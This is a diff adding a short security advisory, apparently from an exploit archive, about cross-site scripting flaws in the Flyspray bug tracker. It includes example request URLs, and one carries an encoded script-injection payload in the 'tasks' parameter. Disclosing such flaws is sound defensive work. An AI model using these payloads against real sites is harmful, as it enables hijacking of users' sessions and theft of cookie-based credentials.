@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/15209/info
+
+Flyspray is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/index.php?PHPSESSID=270ca5a0f7c1e5b2fd4c
+52b34cdfe546&tasks=&project=1&string=lala&type=&sev=&due=
+&dev=&cat=&status=&perpage=20
+
+http://www.example.com/index.php?tasks=all%22%3E%3Cscript
+%3Ealert%28%29%3C%2Fscript%3E&project=0
+
+http://www.example.com/index.php?order=sev&project=1&tasks=&type=
+&sev=&dev=&cat=&status=&due=&string=&perpage=20&pagenum=0&
+sort=desc&order2=&sort2=desc 
